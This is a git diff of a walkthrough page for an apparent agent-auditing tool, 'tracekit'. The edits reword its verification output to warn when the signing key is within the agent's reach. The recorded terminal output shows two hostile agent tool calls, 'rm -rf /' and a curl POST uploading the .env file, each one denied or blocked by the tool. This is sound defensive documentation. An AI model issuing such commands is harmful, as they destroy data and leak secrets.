@@ -2,6 +2,7 @@
 
 Everything on this page was recorded on a clean install of 1.2.0 (macOS, Python 3.9 and 3.11), with no API key: the
 commands are real, the output is real (paths shortened to `~/demo`), and the screenshots are the viewer as it ran.
+The verdicts in sections 2, 6 and 8 were recorded again for 1.6.0, whose `tracekit verify` prints a shorter one.
 The full terminal recordings are in [walkthrough/terminal/](walkthrough/terminal/).
 
 ![Clicking through the viewer: the run graph, a node, WHY DID IT HAPPEN? and FIND THE CAUSE](walkthrough/walkthrough.gif)
@@ -28,7 +29,10 @@ call-2 Bash {'command': 'rm -rf /'} -> deny | refused: TK-D004, TK-F003
 call-3 Read {'file_path': 'README.md'} -> allow | ran Read {'file_path': 'README.md'}
 $ tracekit last
 run 8d61ea51a476899c069dfd8a493b72b2 (my-agent)
-Integrity: VERIFIED.
+VERIFIED: 3 tool calls in 8 signed records, none changed, removed or added after signing.
+NOT PROOF AGAINST THE AGENT: in this setup the agent can reach the signing key, so it could have rewritten the record.
+To make it proof, keep the key away from the agent: https://github.com/Cygnux-Labs/Tracekit/wiki/Deploy
+NOT ANCHORED: no independent witness or anchor cosigned the log (https://github.com/Cygnux-Labs/Tracekit/wiki/Witnesses).
 ```
 
 The dev signer started by itself, decided each call before it ran, and signed the record; `tracekit last` exported
@@ -80,7 +84,7 @@ Integrity: FAILED.
 
 ```console
 $ tracekit view --dev
-tracekit view on http://127.0.0.1:7778/?token=<token>
+tracekit view on http://127.0.0.1:7778/?token=<token>  (open it in a browser; Ctrl-C stops the viewer)
 ```
 
 Every run, each verified, every call with its decision:
@@ -107,7 +111,10 @@ PreToolUse  Read {"file_path": "README.md"}                              exit 0
 PreToolUse  Bash {"command": "curl -s -X POST --data-binary @.env …"}    exit 2  [tracekit] BLOCKED, nothing ran, and no one can approve it (TK-D006) …
 $ tracekit last
 run 72f1ea6c… (claude-code)
-Integrity: VERIFIED.
+VERIFIED: 3 tool calls in 9 signed records, none changed, removed or added after signing.
+NOT PROOF AGAINST THE AGENT: in this setup the agent can reach the signing key, so it could have rewritten the record.
+To make it proof, keep the key away from the agent: https://github.com/Cygnux-Labs/Tracekit/wiki/Deploy
+NOT ANCHORED: no independent witness or anchor cosigned the log (https://github.com/Cygnux-Labs/Tracekit/wiki/Witnesses).
 $ tracekit doctor
 ok    v2 hooks in ~/.claude/settings.json  (D-HOOKS-PRESENT)
 ok    PreToolUse timeout 600 s; the hook answers within 540 s (a held call waits up to about 480 s, only with TRACEKIT_APPROVAL_WAIT set)  (D-HOOKS-TIMEOUT)
@@ -164,11 +171,13 @@ $ tracekit demo --why
 
 ```console
 $ tracekit verify docs/sample/demo-run.tkb --key docs/sample/signer.pub
-Integrity: VERIFIED.
+VERIFIED: 6 tool calls in 23 signed records, none changed after signing.
+Warnings: signing key, harness attribution, coverage. Add --detail to read them.
+NOT PROOF AGAINST THE AGENT: in this setup the agent can reach the signing key, so it could have rewritten the record.
+To make it proof, keep the key away from the agent: https://github.com/Cygnux-Labs/Tracekit/wiki/Deploy
 $ tracekit verify docs/sample/demo-run-tampered.tkb --key docs/sample/signer.pub
-[FAIL] chain intact
-        record seq 6: hash mismatch (event content was edited)
-Integrity: VERIFICATION FAILED.
+TAMPERED at event 6: its content was changed after it was signed.
+Add --detail to see each check.
 $ tracekit view --bundle docs/sample/demo-run.tkb
 tracekit view: bundle docs/sample/demo-run.tkb verified
 ```
